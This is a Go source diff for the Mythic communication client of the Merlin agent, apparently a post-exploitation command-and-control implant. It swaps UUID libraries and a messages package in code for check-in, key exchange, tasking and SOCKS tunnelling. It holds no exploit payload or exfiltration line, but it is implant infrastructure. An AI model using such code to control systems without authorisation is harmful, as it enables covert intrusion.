@@ -48,12 +48,12 @@ import (
 
 	// 3rd Party
 	"github.com/Ne0nd0g/ja3transport"
-	uuid "github.com/satori/go.uuid"
+	"github.com/google/uuid"
 	"golang.org/x/net/http2"
 
 	// Merlin Main
+	"github.com/Ne0nd0g/merlin-message"
 	"github.com/Ne0nd0g/merlin/pkg/jobs"
-	"github.com/Ne0nd0g/merlin/pkg/messages"
 
 	// Internal
 	"github.com/Ne0nd0g/merlin-agent/cli"
@@ -119,7 +119,7 @@ func New(config Config) (*Client, error) {
 
 	// Mythic: Add payload ID
 	var err error
-	client.MythicID, err = uuid.FromString(config.PayloadID)
+	client.MythicID, err = uuid.Parse(config.PayloadID)
 	if err != nil {
 		return &client, err
 	}
@@ -239,7 +239,7 @@ func (client *Client) Send(m messages.Base) (returnMessages []messages.Base, err
 	// Verify UUID matches
 	if !strings.HasPrefix(string(decodedPayload), client.MythicID.String()) {
 		err = fmt.Errorf("response message agent ID %s does not match current ID %s",
-			uuid.FromStringOrNil(string(decodedPayload[:len(client.MythicID)])), client.MythicID.String())
+			uuid.MustParse(string(decodedPayload[:len(client.MythicID)])), client.MythicID.String())
 		return
 	}
 
@@ -471,7 +471,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 		}
 		if msg.Status == "success" {
 			cli.Message(cli.SUCCESS, "initial checkin successful")
-			client.MythicID = uuid.FromStringOrNil(msg.ID)
+			client.MythicID = uuid.MustParse(msg.ID)
 			return
 		}
 		err = fmt.Errorf("unknown checkin action status:\r\n%+v", msg)
@@ -499,7 +499,7 @@ func (client *Client) convertToMerlinMessage(data []byte) (returnMessages []mess
 			return
 		}
 		// Update to use new Temp UUID
-		client.MythicID = uuid.FromStringOrNil(msg.ID)
+		client.MythicID = uuid.MustParse(msg.ID)
 		cli.Message(cli.SUCCESS, "RSA key exchange completed")
 		return
 	case TASKING:
@@ -636,7 +636,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 		// Convert Merlin jobs to mythic response
 		for _, job := range m.Payload.([]jobs.Job) {
 			var response ClientTaskResponse
-			response.ID = uuid.FromStringOrNil(job.ID)
+			response.ID = uuid.MustParse(job.ID)
 			response.Completed = true
 			cli.Message(cli.DEBUG, fmt.Sprintf("Converting Merlin job type: %d to Mythic response", job.Type))
 			switch job.Type {
@@ -713,7 +713,7 @@ func (client *Client) convertToMythicMessage(m messages.Base) (string, error) {
 					mythicSocksConnection.Delete(sockMsg.ID)
 				}
 			default:
-				return "", fmt.Errorf("unhandled job type in convertToMythicMessage: %s", jobs.String(job.Type))
+				return "", fmt.Errorf("unhandled job type in convertToMythicMessage: %s", job.Type)
 			}
 		}
 		// Marshal the structure to a JSON object
@@ -807,7 +807,7 @@ func (client *Client) convertSocksToJobs(socks []Socks) (base messages.Base, err
 		id, ok := socksConnection.Load(sock.ServerId)
 		if !ok {
 			// This is for a new, first time, SOCKS connection
-			id = uuid.NewV4()
+			id = uuid.New()
 			socksConnection.Store(sock.ServerId, id)
 			mythicSocksConnection.Store(id, sock.ServerId)
 
@@ -855,7 +855,7 @@ func (client *Client) convertTasksToJobs(tasks []Task) (messages.Base, error) {
 		}
 		job.AgentID = client.AgentID
 		job.ID = task.ID
-		job.Token = uuid.FromStringOrNil(task.ID)
+		job.Token = uuid.MustParse(task.ID)
 		job.Type = mythicJob.Type
 
 		cli.Message(cli.DEBUG, fmt.Sprintf("Switching on mythic.Job type %d", mythicJob.Type))
